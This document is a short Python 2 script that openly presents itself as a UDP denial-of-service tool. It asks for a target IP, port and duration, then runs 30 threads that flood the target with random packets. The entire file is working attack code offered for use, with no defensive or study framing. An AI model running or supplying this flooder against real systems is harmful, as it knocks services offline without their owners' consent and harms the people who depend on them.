# Created by LeoDaVinci
import time
import socket
import random
import threading
import sys

print "Welcome to Leo's UDP DoS tool! Please input your targets IP, Port number (ex 80), and amount of time in seconds for attack. "

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

victim = raw_input('Enter your targets ip: ')
vport = raw_input('Enter Port number: ')
duration = raw_input('Time for attack in seconds: ')


def worker(victim, vport):
    sent = 0
    while 1 == 1:
        client.sendto(bytes, (victim, int(vport)))
        sent += 30
        print "%s sent packages, Hitting, %s on port, %s " % (sent, victim, vport)


threads = []

for i in range(30):
    t = threading.Thread(name=i, target=worker, args=(victim, vport,))
    t.start()

time.sleep(float(duration))

sys.exit()
